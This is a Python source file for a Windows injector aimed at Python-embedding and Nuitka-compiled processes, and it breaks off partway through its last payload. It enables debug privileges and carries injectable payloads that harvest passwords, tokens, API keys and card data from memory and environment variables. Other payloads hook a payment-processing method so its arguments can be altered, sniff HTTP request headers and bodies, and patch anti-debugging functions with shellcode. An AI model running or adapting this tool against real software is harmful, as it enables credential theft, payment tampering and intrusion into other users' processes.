import sys
import os
import ctypes
import base64
import struct
import re
from ctypes import wintypes
from typing import List, Dict

try:
    import psutil
    import pymem
    import pymem.process
    import pefile
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt
    from rich import box
except ImportError as e:
    print(f"[ERROR] Missing dependency: {e}")
    sys.exit(1)

console = Console()



kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32

kernel32.CreateRemoteThread.argtypes = [
    wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, 
    ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD, ctypes.c_void_p
]
kernel32.CreateRemoteThread.restype = wintypes.HANDLE

SE_DEBUG_NAME = "SeDebugPrivilege"
SE_PRIVILEGE_ENABLED = 0x00000002


class LUID(ctypes.Structure):
    _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [("PrivilegeCount", wintypes.DWORD),
                ("Privileges", LUID_AND_ATTRIBUTES * 1)]

def is_admin() -> bool:
    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: return False

def enable_debug_privilege() -> bool:
    try:
        h_token = wintypes.HANDLE()
        if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), 0x0028, ctypes.byref(h_token)): 
            return False

        luid = LUID()
        if not advapi32.LookupPrivilegeValueW(None, SE_DEBUG_NAME, ctypes.byref(luid)):
            kernel32.CloseHandle(h_token)
            return False

        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

        if not advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(tp), ctypes.sizeof(tp), None, None):
            kernel32.CloseHandle(h_token)
            return False

        if kernel32.GetLastError() == 1300: 
            kernel32.CloseHandle(h_token)
            return False

        kernel32.CloseHandle(h_token)
        return True
    except: return False

class SYSTEM_INFO(ctypes.Structure):
    _fields_ = [("wProcessorArchitecture", wintypes.WORD),
                ("wReserved", wintypes.WORD),
                ("dwPageSize", wintypes.DWORD),
                ("lpMinimumApplicationAddress", ctypes.c_void_p),
                ("lpMaximumApplicationAddress", ctypes.c_void_p),
                ("dwActiveProcessorMask", ctypes.c_void_p),
                ("dwNumberOfProcessors", wintypes.DWORD),
                ("dwProcessorType", wintypes.DWORD),
                ("dwAllocationGranularity", wintypes.DWORD),
                ("wProcessorLevel", wintypes.WORD),
                ("wProcessorRevision", wintypes.WORD)]

def get_arch(pid: int) -> str:
    sys_info = SYSTEM_INFO()
    kernel32.GetNativeSystemInfo(ctypes.byref(sys_info))

    os_arch_x64 = (sys_info.wProcessorArchitecture == 9)

    if not os_arch_x64:
        return "x86"

    h = None
    try:
        h = kernel32.OpenProcess(0x1000, False, pid)
        if not h: return "Unknown"
        
        wow64 = ctypes.c_bool()
        if not kernel32.IsWow64Process(h, ctypes.byref(wow64)):
            return "Unknown"
            
        return "x86" if wow64.value else "x64"
    except: 
        return "Unknown"
    finally:
        if h: kernel32.CloseHandle(h)

PYAPI_SIGNATURES = {
    'PyRun_SimpleString': b'PyRun_SimpleString',
    'PyGILState_Ensure':  b'PyGILState_Ensure',
    'PyGILState_Release': b'PyGILState_Release',
}

def _probe_exe_for_python_api(exe_path: str) -> bool:
    try:
        pe = pefile.PE(exe_path, fast_load=True)
        pe.parse_data_directories(directories=[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_EXPORT']])
        if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
            names = {exp.name for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols if exp.name}
            for sig in PYAPI_SIGNATURES.values():
                if sig in names:
                    pe.close()
                    return True
        pe.close()
    except:
        pass
    return False

_SKIP_NAMES = {
    'system', 'registry', 'smss.exe', 'csrss.exe', 'wininit.exe',
    'services.exe', 'lsass.exe', 'svchost.exe', 'dwm.exe', 'conhost.exe',
    'explorer.exe', 'taskhostw.exe', 'sihost.exe', 'ctfmon.exe',
    'searchhost.exe', 'runtimebroker.exe', 'shellexperiencehost.exe',
    'startmenuexperiencehost.exe', 'textinputhost.exe', 'dllhost.exe',
    'fontdrvhost.exe', 'winlogon.exe', 'spoolsv.exe', 'msdtc.exe',
    'audiodg.exe', 'searchindexer.exe', 'securityhealthservice.exe',
    'msedge.exe', 'chrome.exe', 'firefox.exe', 'opera.exe', 'brave.exe',
}

def scan_procs() -> List[Dict]:
    res = []
    with console.status("[cyan]Scanning processes...[/cyan]", spinner="dots") as status:
        for p in psutil.process_iter(['pid', 'name', 'exe']):
            try:
                pid = p.info['pid']
                if pid <= 4:
                    continue
                pname = p.info['name'] or ''

                proc = psutil.Process(pid)
                try:
                    dlls = [m.path for m in proc.memory_maps()]
                except (psutil.AccessDenied, psutil.NoSuchProcess):
                    continue
                py_dlls = [d for d in dlls if 'python' in d.lower() and d.lower().endswith('.dll')]

                if py_dlls:
                    dll_path = py_dlls[0]
                    dll_name = os.path.basename(dll_path)
                    ver_m = re.search(r'python(\d)(\d+)', dll_name.lower())
                    ver = f"{ver_m.group(1)}.{ver_m.group(2)}" if ver_m else "??"
                    res.append({
                        'pid': pid, 'name': pname, 'ver': ver,
                        'dll_path': dll_path, 'dll_name': dll_name, 'arch': get_arch(pid),
                        'static': False
                    })
                else:
                    if pname.lower() in _SKIP_NAMES:
                        continue
                    exe_path = p.info.get('exe', '')
                    if exe_path and os.path.isfile(exe_path):
                        status.update(f"[cyan]Probing {pname}...[/cyan]")
                        if _probe_exe_for_python_api(exe_path):
                            res.append({
                                'pid': pid, 'name': pname, 'ver': 'static',
                                'dll_path': exe_path, 'dll_name': os.path.basename(exe_path),
                                'arch': get_arch(pid), 'static': True
                            })
            except:
                continue
    return res



def get_common_header() -> str:
    return r"""
import sys
import os

def save_log(filename, lines):
    text = "\n".join(lines)
    paths = [
        "C:\\" + filename,
        os.path.join(os.environ.get("TEMP", "C:\\"), filename)
    ]
    for p in paths:
        try:
            with open(p, "w", encoding="utf-8") as f:
                f.write(text)
            break
        except: continue
"""

# начало пейлоадов
    
def payload_dumper() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Dumping Global Scope (__main__)"]
    try:
        import __main__

        g_vars = vars(__main__)
        for name, val in g_vars.items():
            if not name.startswith("__"):
                lines.append(f"VAR: {name} = {str(val)}")
                
                try:
                    if hasattr(val, '__dict__'):
                        lines.append(f"  -> INSIDE {name}: {str(vars(val))}")
                except: pass

    except Exception as e: lines.append("Error: " + str(e))
    save_log("nuitka_full_dump.txt", lines)
try: run()
except: pass
"""

def payload_inspector() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Inspecting Target Class Structure"]
    try:
        import __main__
        
        
        found_classes = []
        
        for name in dir(__main__):
            if name.startswith("__"): continue
            
            val = getattr(__main__, name)
            if isinstance(val, type):
                found_classes.append(val)

        if not found_classes:
            lines.append("[-] No custom classes found in __main__.")
            lines.append("[*] The target might be using functions only or obfuscated imports.")
        else:
            lines.append(f"[*] Discovered {len(found_classes)} classes via Reflection:")
            
            for cls in found_classes:
                lines.append("")
                lines.append("="*40)
                lines.append(f"[+] CLASS: {cls.__name__}")
                lines.append("="*40)
                
                count = 0
                for item in dir(cls):
                    if item.startswith("__"): continue
                    
                    try:
                        attr = getattr(cls, item)
                        attr_type = type(attr).__name__
                        
                        if callable(attr):
                            lines.append(f"    [M] {item}() -> {attr_type}")
                        else:
                            val_str = str(attr)
                            if len(val_str) > 50: val_str = val_str[:47] + "..."
                            lines.append(f"    [V] {item} = {val_str} ({attr_type})")
                        count += 1
                    except:
                        lines.append(f"    [?] {item} (Access Denied)")
                
                if count == 0:
                    lines.append("    (No public methods or attributes found)")

    except Exception as e:
        lines.append(f"[-] Inspector Error: {e}")

    save_log("nuitka_inspector.txt", lines)

try: run()
except: pass
"""

def payload_fuzzer() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Probing Method Arguments (Fuzzing)"]
    try:
        import __main__

        # (!) конфигурация: таргет для фаззера
        
        # имя класса, который хотим сломать
        TARGET_CLASS_NAME = "PaymentProcessor" 
        
        # имя метода, который вызовем без аргументов, чтобы получить сигнатуру
        TARGET_METHOD_NAME = "process_transaction"

        # -------------------------------------------------------------------------
        
        lines.append(f"[*] Target: {TARGET_CLASS_NAME}.{TARGET_METHOD_NAME}")

        # ищем класс
        cls = getattr(__main__, TARGET_CLASS_NAME, None)
        if not cls:
            lines.append(f"[-] Class '{TARGET_CLASS_NAME}' not found.")
            lines.append("[*] Update payload_fuzzer() with correct target names.")
        else:
            # создаем экземпляр
            try:
                inst = cls()
                
                # ищем метод
                if not hasattr(inst, TARGET_METHOD_NAME):
                     lines.append(f"[-] Method '{TARGET_METHOD_NAME}' not found.")
                else:
                    method_to_call = getattr(inst, TARGET_METHOD_NAME)
                    
                    # атака: вызываем пустой метод
                    lines.append("[*] Fuzzing: calling method with NO arguments...")
                    try:
                        method_to_call()
                        lines.append("[?] Unexpected Success (Method takes no args?)")
                    except TypeError as e:
                        # пайтон сам расскажет, какие аргументы нужны
                        lines.append("[!] SIGNATURE LEAKED via TypeError:")
                        lines.append(f"    >> {e}")
                    except Exception as e:
                        lines.append(f"[-] Runtime Error: {e}")

            except Exception as e:
                lines.append(f"[-] Instantiation Error (Failed to create object): {e}")

    except Exception as e:
        lines.append(f"[-] Fuzzer Fatal Error: {e}")

    save_log("nuitka_fuzzer_log.txt", lines)

try: run()
except: pass
"""

def payload_payday() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Executing Custom Payday Payload"]
    try:
        import __main__

        # =======================================================
        # (!) напиши свой код тут
        # =======================================================

        lines.append("[!] No custom payload defined yet.")
        lines.append("[*] Edit payload_payday() in injector.py to add logic.")

        # =======================================================

    except Exception as e:
        lines.append(f"[-] Payload Error: {e}")

    save_log("nuitka_payday_log.txt", lines)

try: run()
except: pass
"""

def payload_anti_anti_debug() -> str:
    return get_common_header() + r"""
import ctypes
import struct

def run():
    lines = ["[*] Executing Deep Anti-Anti-Debug bypass (REAL memory patching)"]
    patched = 0
    try:
        if not hasattr(ctypes, 'windll'):
            lines.append("[-] No ctypes.windll — skipping (non-Windows?)")
            save_log("nuitka_anti_anti_debug.txt", lines)
            return

        k32 = ctypes.windll.kernel32
        ntdll = ctypes.windll.ntdll

        PAGE_EXECUTE_READWRITE = 0x40
        old_protect = ctypes.c_ulong(0)

        def patch_bytes(module_name, func_name, patch, description):    
            nonlocal patched
            try:
                h_mod = k32.GetModuleHandleA(module_name)
                if not h_mod:
                    lines.append(f"[-] Module '{module_name.decode()}' not found")
                    return False

                addr = k32.GetProcAddress(h_mod, func_name)
                if not addr:
                    lines.append(f"[-] Function '{func_name.decode()}' not found in {module_name.decode()}")
                    return False

                # make the memory writable
                if not k32.VirtualProtect(
                    ctypes.c_void_p(addr), len(patch),
                    PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)
                ):
                    lines.append(f"[-] VirtualProtect failed for {func_name.decode()} (err={k32.GetLastError()})")
                    return False

                # write the patch
                ctypes.memmove(ctypes.c_void_p(addr), patch, len(patch))

                # restore original protection
                k32.VirtualProtect(
                    ctypes.c_void_p(addr), len(patch),
                    old_protect.value, ctypes.byref(old_protect)
                )

                lines.append(f"[+] {description}: wrote {len(patch)} bytes at 0x{addr:X}")
                patched += 1
                return True
            except Exception as e:
                lines.append(f"[-] {description} failed: {e}")
                return False

        # ----------------------------------------------------------------
        # 1. IsDebuggerPresent -> xor eax, eax; ret  (always returns 0)
        #    x86/x64: 31 C0 C3
        # ----------------------------------------------------------------
        patch_bytes(
            b"kernel32.dll", b"IsDebuggerPresent",
            b"\x31\xC0\xC3",
            "IsDebuggerPresent -> ret 0"
        )

        # ----------------------------------------------------------------
        # 2. CheckRemoteDebuggerPresent
        #    x64: mov dword ptr [rdx], 0; xor eax,eax; ret
        #         C7 02 00 00 00 00  31 C0  C3
        #    x86: push ebp; mov ebp,esp; mov eax,[ebp+0Ch]; mov dword [eax],0; xor eax,eax; pop ebp; ret 8
        #         55 8B EC 8B 45 0C C7 00 00 00 00 00 31 C0 5D C2 08 00
        # ----------------------------------------------------------------
        import platform
        if platform.architecture()[0] == '64bit':
            patch_bytes(
                b"kernel32.dll", b"CheckRemoteDebuggerPresent",
                b"\xC7\x02\x00\x00\x00\x00\x31\xC0\xC3",
                "CheckRemoteDebuggerPresent -> *pbDebugger=0, ret 0 (x64)"
            )
        else:
            patch_bytes(
                b"kernel32.dll", b"CheckRemoteDebuggerPresent",
                b"\x55\x8B\xEC\x8B\x45\x0C\xC7\x00\x00\x00\x00\x00\x31\xC0\x5D\xC2\x08\x00",
                "CheckRemoteDebuggerPresent -> *pbDebugger=0, ret 0 (x86)"
            )

        # ----------------------------------------------------------------
        # 3. NtQueryInformationProcess — return STATUS_INVALID_INFO_CLASS (0xC0000003)
        #    to prevent leaking DebugPort / DebugObjectHandle
        #    x64: mov eax, 0xC0000003; ret
        #         B8 03 00 00 C0 C3
        #    x86: mov eax, 0xC0000003; ret 0x14
        #         B8 03 00 00 C0 C2 14 00
        #    NOTE: this is aggressive — it blocks ALL NtQueryInformationProcess calls.
        #    A more precise hook would check the InfoClass parameter, but that requires
        #    a full trampoline (JMP hook), which is much more complex from Python.
        # ----------------------------------------------------------------
        if platform.architecture()[0] == '64bit':
            patch_bytes(
                b"ntdll.dll", b"NtQueryInformationProcess",
                b"\xB8\x03\x00\x00\xC0\xC3",
                "NtQueryInformationProcess -> STATUS_INVALID_INFO_CLASS (x64)"
            )
        else:
            patch_bytes(
                b"ntdll.dll", b"NtQueryInformationProcess",
                b"\xB8\x03\x00\x00\xC0\xC2\x14\x00",
                "NtQueryInformationProcess -> STATUS_INVALID_INFO_CLASS (x86)"
            )

        # ----------------------------------------------------------------
        # 4. NtSetInformationThread — block ThreadHideFromDebugger (0x11)
        #    Same approach: return STATUS_SUCCESS (0) immediately
        #    x64: xor eax,eax; ret       -> 31 C0 C3
        #    x86: xor eax,eax; ret 0x10  -> 31 C0 C2 10 00
        # ----------------------------------------------------------------
        if platform.architecture()[0] == '64bit':
            patch_bytes(
                b"ntdll.dll", b"NtSetInformationThread",
                b"\x31\xC0\xC3",
                "NtSetInformationThread -> ret 0 (blocks ThreadHideFromDebugger, x64)"
            )
        else:
            patch_bytes(
                b"ntdll.dll", b"NtSetInformationThread",
                b"\x31\xC0\xC2\x10\x00",
                "NtSetInformationThread -> ret 0 (blocks ThreadHideFromDebugger, x86)"
            )

        # ----------------------------------------------------------------
        # 5. PEB.BeingDebugged flag — zero it out directly
        # ----------------------------------------------------------------
        try:
            if platform.architecture()[0] == '64bit':
                # x64: PEB at GS:[0x60], BeingDebugged at PEB+0x02
                peb_code = (
                    b"\x65\x48\x8B\x04\x25\x60\x00\x00\x00"  # mov rax, gs:[0x60]
                    b"\xC6\x40\x02\x00"                        # mov byte [rax+2], 0
                    b"\xC3"                                    # ret
                )
            else:
                # x86: PEB at FS:[0x30], BeingDebugged at PEB+0x02
                peb_code = (
                    b"\x64\xA1\x30\x00\x00\x00"  # mov eax, fs:[0x30]
                    b"\xC6\x40\x02\x00"            # mov byte [eax+2], 0
                    b"\xC3"                        # ret
                )

            # allocate + exec shellcode to clear PEB.BeingDebugged
            MEM_COMMIT = 0x1000
            addr = k32.VirtualAlloc(None, len(peb_code), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
            if addr:
                ctypes.memmove(addr, peb_code, len(peb_code))
                thread_func = ctypes.cast(addr, ctypes.CFUNCTYPE(None))
                thread_func()
                k32.VirtualFree(ctypes.c_void_p(addr), 0, 0x8000)  # MEM_RELEASE
                lines.append(f"[+] PEB.BeingDebugged cleared to 0")
                patched += 1
            else:
                lines.append("[-] VirtualAlloc failed for PEB patch")
        except Exception as e:
            lines.append(f"[-] PEB patch failed: {e}")

        lines.append(f"")
        lines.append(f"[*] Total patches applied: {patched}/5")
        lines.append("[*] NOTE: patches are IN-MEMORY only, applied to THIS process.")
        lines.append("[*] Native C/C++ anti-debug checks in this process are now neutered.")

    except Exception as e:
        lines.append(f"[-] Fatal Error: {e}")

    save_log("nuitka_anti_anti_debug.txt", lines)
try: run()
except: pass
"""


def payload_deep_scan() -> str:
    return get_common_header() + r"""
import gc

def run():
    lines = ["[*] Analyzing Python Objects (GC dump)"]
    lines.append("Scanning heap for strings and bytes...")
    
    keywords = [
    b'pass',
    b'passwd',
    b'password',
    b'pwd',
    b'secret',
    b'secret_key',
    b'private',
    b'private_key',
    b'public_key',
    b'key',
    b'api',
    b'api_key',
    b'apikey',
    b'token',
    b'access_token',
    b'refresh_token',
    b'auth',
    b'authorization',
    b'bearer',
    b'credential',
    b'credentials',
    b'postgres',
    b'postgresql',
    b'pgsql',
    b'mysql',
    b'mariadb',
    b'sqlite',
    b'oracle',
    b'mssql',
    b'redis',
    b'mongodb',
    b'cassandra',
    b'db',
    b'database',
    b'jdbc',
    b'dsn',
    b'http://',
    b'https://',
    b'ws://',
    b'wss://',
    b'ftp://',
    b'api/',
    b'/api',
    b'endpoint',
    b'callback',
    b'webhook',
    b'upload',
    b'download',
    b'admin',
    b'root',
    b'superuser',
    b'user',
    b'username',
    b'login',
    b'email',
    b'role',
    b'roles',
    b'permission',
    b'permissions',
    b'payment',
    b'pay',
    b'billing',
    b'invoice',
    b'transaction',
    b'amount',
    b'balance',
    b'credit',
    b'debit',
    b'card',
    b'cc_number',
    b'cvv',
    b'aws',
    b'aws_access_key',
    b'aws_secret',
    b's3',
    b'azure',
    b'gcp',
    b'google',
    b'firebase',
    b'slack',
    b'discord',
    b'telegram',
    b'bot_token',
    b'debug',
    b'dev',
    b'test',
    b'staging',
    b'prod',
    b'production',
    b'local',
    b'todo',
    b'fixme',
    b'hook',
    b'hooked',
    b'patch',
    b'monkey',
    b'inject',
    b'intercept',
    b'override',
    b'wrap',
    b'proxy',
    b'middleware',
    b'nuitka',
    b'pyinstaller',
    b'__main__',
    b'compiled',
    b'bootstrap',
    b'runtime',
]
    count = 0
    
    try:
        all_objects = gc.get_objects()
        for obj in all_objects:
            if isinstance(obj, str):
                if len(obj) < 300 and len(obj) > 4:
                    try: val_bytes = obj.encode('utf-8', 'ignore').lower()
                    except: continue
                    
                    if any(k in val_bytes for k in keywords):
                        if b"lib\\" not in val_bytes and b"site-packages" not in val_bytes:
                            lines.append(f"[FOUND STR] {repr(obj)}")
                            count += 1
                            
            elif isinstance(obj, (bytes, bytearray)):
                if len(obj) < 300 and len(obj) > 4:
                    val_lower = obj.lower()
                    if any(k in val_lower for k in keywords):
                        lines.append(f"[FOUND BYTES] {obj}")
                        count += 1
                        
    except Exception as e:
        lines.append(f"Scan interrupted: {e}")
        
    lines.append("-" * 30)
    lines.append(f"Total secrets found: {count}")
    save_log("nuitka_deepscan.txt", lines)

try: run()
except: pass
"""

def payload_mitm() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Installing MITM Hooks"]
    try:
        import __main__
        import functools

        # (!) конфигурация
        
        # какое имя класса искать? (оставь None, если функция глобальная)
        TARGET_CLASS_NAME = "PaymentProcessor"  
        
        # какое имя метода перехватывать?
        TARGET_METHOD_NAME = "process_transaction" 
        

        def spy_decorator(original_func):
            @functools.wraps(original_func)
            def wrapper(*args, **kwargs):
                # логируем перехват
                lines.append(f"[>>] INTERCEPTED call to {TARGET_METHOD_NAME}")
                lines.append(f"     Args: {args} | Kwargs: {kwargs}")
                
                # (опционально) можем подменить аргументы тут
                # new_args = list(args)
                # if len(new_args) > 1: new_args[1] = 1337 
                
                # вызываем настоящую функцию
                try:
                    result = original_func(*args, **kwargs)
                    lines.append(f"[<<] Returned: {result}")
                    return result
                except Exception as e:
                    lines.append(f"[!!] Exception in original func: {e}")
                    raise e
            return wrapper

        # логика установки хука
        target_cls = getattr(__main__, TARGET_CLASS_NAME, None)
        if target_cls:
            if hasattr(target_cls, TARGET_METHOD_NAME):
                original = getattr(target_cls, TARGET_METHOD_NAME)
                setattr(target_cls, TARGET_METHOD_NAME, spy_decorator(original))
                lines.append(f"[+] Hook installed on {TARGET_CLASS_NAME}.{TARGET_METHOD_NAME}")
            else:
                lines.append(f"[-] Method {TARGET_METHOD_NAME} not found in class.")
        else:
             lines.append(f"[-] Class {TARGET_CLASS_NAME} not found.")

    except Exception as e:
        lines.append(f"[-] MITM Error: {e}")

    save_log("nuitka_mitm_log.txt", lines)

try: run()
except: pass
"""

def payload_http_spy() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Starting HTTP/HTTPS Sniffer"]
    try:
        import sys
        import os
        
        if 'requests' not in sys.modules:
            lines.append("[-] 'requests' module not loaded in target.")
            save_log("nuitka_http_spy.txt", lines)
            return

        import requests
        lines.append("[+] Hooking requests.Session.request")
        
        original_request = requests.Session.request
        
        def new_request(self, method, url, *args, **kwargs):
            log_entry =  f"\n{'='*40}\n"
            log_entry += f"[TIME] Request Intercepted\n"
            log_entry += f"[REQ]  {method.upper()} {url}\n"
            
            headers = kwargs.get('headers')
            if headers: log_entry += f"[HDR]  {headers}\n"
            
            data = kwargs.get('data')
            if data:    log_entry += f"[DAT]  {data}\n"
            
            json_data = kwargs.get('json')
            if json_data: log_entry += f"[JSN]  {json_data}\n"
            
            try:
                path = os.path.join(os.environ.get("TEMP", "C:\\"), "nuitka_http_spy.txt")
                with open(path, "a", encoding="utf-8") as f:
                    f.write(log_entry)
            except: pass
            
            return original_request(self, method, url, *args, **kwargs)
            
        requests.Session.request = new_request
        lines.append("[*] Sniffer active. Check log file for updates.")

    except Exception as e:
        lines.append(f"[-] Sniffer Error: {e}")
    
    save_log("nuitka_http_spy.txt", lines)

try: run()
except: pass
"""

def payload_env_dump() -> str:
    return get_common_header() + r"""
def run():
    lines = ["[*] Analyzing Process Environment"]
    try:
        import os
        
        keywords = [
            'KEY', 'TOKEN', 'SECRET', 'PASS', 'AUTH', 'CRED',
            'AWS', 'AZURE', 'GCP', 'GOOGLE', 'CLOUD',      
            'DB', 'URL', 'CONNECTION', 'DSN', 'HOST',   
            'API', 'CLIENT', 'USER', 'ADMIN', 'LOGIN',    
            'PRIVATE', 'CERT', 'SSH', 'SALT', 'BUCKET'     
        ]
        
        env_vars = dict(os.environ)
        
        if not env_vars:
            lines.append("[-] Environment is empty.")
        else:
            lines.append(f"[*] Total variables: {len(env_vars)}\n")
            
            lines.append("--- [ Priority Keys ] ---")
            found_secrets = False
            for k, v in env_vars.items():
                if any(x in k.upper() for x in keywords):
                    lines.append(f"{k} = {v}")
                    found_secrets = True
            
            if not found_secrets: lines.append("(No sensitive keys detected via keywords)")
            
            lines.append("\n--- [ System Environment ] ---")
            for k, v in sorted(env_vars.items()):
                if not any(x in k.upper() for x in keywords):
                    lines.append(f"{k} = {v}")

    except Exception as e:
        lines.append(f"[-] Error: {e}")
    
    save_log("nuitka_env.txt", lines)

try: run()
except: pass
"""


def payload_trace_logger() -> str:
    return get_common_header() + r"""
import sys
import threading
import time

def run():
    lines = ["[*] Installing Trace Logger (sys.settrace)"]
    lines.append("[!] NOTE: Nuitka-compiled functions may not emit trace events")
    lines.append("[!]        unless built with --python-flag=no_optimization.")
    lines.append("[!]        This payload is most effective on PyInstaller / mixed builds.")
    
    MAX_EVENTS = 5000
    trace_log = []
    event_count = [0]
    start_time = [time.time()]
    
    def trace_func(frame, event, arg):
        if event_count[0] >= MAX_EVENTS:
            sys.settrace(None)
            return None
        
        if event in ('call', 'return'):
            elapsed = time.time() - start_time[0]
            co = frame.f_code
            filename = co.co_filename
            
            # skip stdlib / site-packages noise
            skip = ['importlib', 'site-packages', '<frozen', 'encodings',
                    'codecs.py', 'abc.py', '_bootstrap', 'zipimport']
            if any(s in filename for s in skip):
                return trace_func
            
            func_name = co.co_name
            lineno = frame.f_lineno
            depth = 0
            f = frame.f_back
            while f:
                depth += 1
                f = f.f_back
            
            indent = '  ' * min(depth, 20)
            
            if event == 'call':
                # try to capture arguments
                arg_info = ''
                try:
                    varnames = co.co_varnames[:co.co_argcount]
                    arg_parts = []
                    for vn in varnames:
                        if vn in frame.f_locals:
                            val = frame.f_locals[vn]
                            val_s = repr(val)
                            if len(val_s) > 80: val_s = val_s[:77] + '...'
                            arg_parts.append(f'{vn}={val_s}')
                    if arg_parts:
                        arg_info = '(' + ', '.join(arg_parts) + ')'
                except: pass
                
                entry = f'[{elapsed:.4f}] {indent}>> CALL  {func_name}{arg_info}  [{filename}:{lineno}]'
            else:
                ret_s = ''
                try:
                    if arg is not None:
                        ret_s = repr(arg)
                        if len(ret_s) > 80: ret_s = ret_s[:77] + '...'
                        ret_s = f' -> {ret_s}'
                except: pass
                entry = f'[{elapsed:.4f}] {indent}<< RET   {func_name}{ret_s}  [{filename}:{lineno}]'
            
            trace_log.append(entry)
            event_count[0] += 1
        
        return trace_func
    
    # install trace on the current thread
    sys.settrace(trace_func)
    
    # also try sys.setprofile for C-level calls
    profile_log = []
    def profile_func(frame, event, arg):
        if event in ('c_call', 'c_return'):
            try:
                elapsed = time.time() - start_time[0]
                name = getattr(arg, '__name__', str(arg))
                profile_log.append(f'[{elapsed:.4f}] C-{event}: {name}')
            except: pass
    
    try:
        sys.setprofile(profile_func)
    except: pass
    
    lines.append(f"[+] Trace installed. Logging up to {MAX_EVENTS} events.")
    lines.append("[*] Waiting 10 seconds for activity...")
    
    # flush after delay in a background thread
    def flush():
        time.sleep(10)
        sys.settrace(None)
        try: sys.setprofile(None)
        except: pass
        
        final = ["[*] === TRACE LOG ==="]
        final.append(f"[*] Captured {len(trace_log)} call/return events")
        final.append(f"[*] Captured {len(profile_log)} C-level events")
        final.append("")
        final.extend(trace_log)
        if profile_log:
            final.append("")
            final.append("[*] === C-LEVEL EVENTS ===")
            final.extend(profile_log[:500])
        
        save_log("nuitka_trace.txt", final)
    
    t = threading.Thread(target=flush, daemon=True)
    t.start()
    
    lines.append("[*] Background flush thread started.")
    save_log("nuitka_trace.txt", lines)

try: run()
except: pass
"""


def payload_nuitka_explorer() -> str:
    return get_common_header() + r"""
import gc
import types

def run():
    lines = ["[*] Nuitka Object Explorer — scanning GC heap"]
    
    nuitka_funcs = []
    nuitka_modules = []
    regular_funcs = []
    code_objects = []
    class_objects = []
    
    try:
        all_objects = gc.get_objects()
        lines.append(f"[*] Total GC-tracked objects: {len(all_objects)}")
        
        for obj in all_objects:
            try:
                otype = type(obj).__name__
                omodule = type(obj).__module__ if hasattr(type(obj), '__module__') else ''
                
                # Nuitka compiled functions have special types
                if 'compiled_function' in otype.lower() or \
                   'nuitka' in otype.lower() or \
                   'compiled_method' in otype.lower() or \
                   (omodule and 'nuitka' in omodule.lower()):
                    name = getattr(obj, '__name__', getattr(obj, '__qualname__', repr(obj)))
                    module = getattr(obj, '__module__', '??')
                    doc = getattr(obj, '__doc__', None)
                    nuitka_funcs.append({
                        'name': name, 'module': module, 'type': otype, 'doc': doc,
                        'qualname': getattr(obj, '__qualname__', '??')
                    })
                
                elif isinstance(obj, types.FunctionType):
                    name = getattr(obj, '__qualname__', obj.__name__)
                    module = getattr(obj, '__module__', '??')
                    # get signature info from code object
                    co = obj.__code__
                    args = co.co_varnames[:co.co_argcount]
                    regular_funcs.append({
                        'name': name, 'module': module,
                        'args': list(args), 'file': co.co_filename, 'line': co.co_firstlineno
                    })
                
                elif isinstance(obj, types.ModuleType):
                    mname = getattr(obj, '__name__', '??')
                    mfile = getattr(obj, '__file__', None)
                    if mfile and 'nuitka' in str(mfile).lower():
                        nuitka_modules.append({'name': mname, 'file': mfile})
                    elif mname and ('__main__' in mname or mname.startswith('_')):
                        nuitka_modules.append({'name': mname, 'file': mfile})
                
                elif isinstance(obj, types.CodeType):
                    code_objects.append({
                        'name': obj.co_name, 'file': obj.co_filename,
                        'args': list(obj.co_varnames[:obj.co_argcount]),
                        'line': obj.co_firstlineno, 'size': len(obj.co_code)
                    })
                
                elif isinstance(obj, type):
                    # custom classes (not builtins)
                    mod = getattr(obj, '__module__', '')
                    if mod and mod != 'builtins' and not mod.startswith('_'):
                        methods = [m for m in dir(obj) if not m.startswith('__') and callable(getattr(obj, m, None))]
                        attrs = [a for a in dir(obj) if not a.startswith('__') and not callable(getattr(obj, a, None))]
                        class_objects.append({
                            'name': obj.__name__, 'module': mod,
                            'methods': methods[:30], 'attrs': attrs[:30]
                        })
            except:
                continue
    except Exception as e:
        lines.append(f"[-] GC scan error: {e}")
    
    # Report
    lines.append("")
    lines.append(f"{'='*60}")
    lines.append(f"[*] NUITKA COMPILED FUNCTIONS: {len(nuitka_funcs)}")
    lines.append(f"{'='*60}")
    for nf in nuitka_funcs[:200]:
        lines.append(f"  [{nf['type']}] {nf['module']}.{nf['qualname']}")
        if nf['doc']:
            doc_s = str(nf['doc'])[:120]
            lines.append(f"    doc: {doc_s}")
    
    lines.append("")
    lines.append(f"{'='*60}")
    lines.append(f"[*] REGULAR PYTHON FUNCTIONS: {len(regular_funcs)}")
    lines.append(f"{'='*60}")
    for rf in regular_funcs[:200]:
        args_s = ', '.join(rf['args'])
        lines.append(f"  def {rf['name']}({args_s})  [{rf['file']}:{rf['line']}]")
    
    lines.append("")
    lines.append(f"{'='*60}")
    lines.append(f"[*] CLASSES: {len(class_objects)}")
    lines.append(f"{'='*60}")
    for co in class_objects[:100]:
        lines.append(f"  class {co['module']}.{co['name']}")
        if co['methods']:
            lines.append(f"    methods: {', '.join(co['methods'])}")
        if co['attrs']:
            lines.append(f"    attrs:   {', '.join(co['attrs'])}")
    
    lines.append("")
    lines.append(f"{'='*60}")
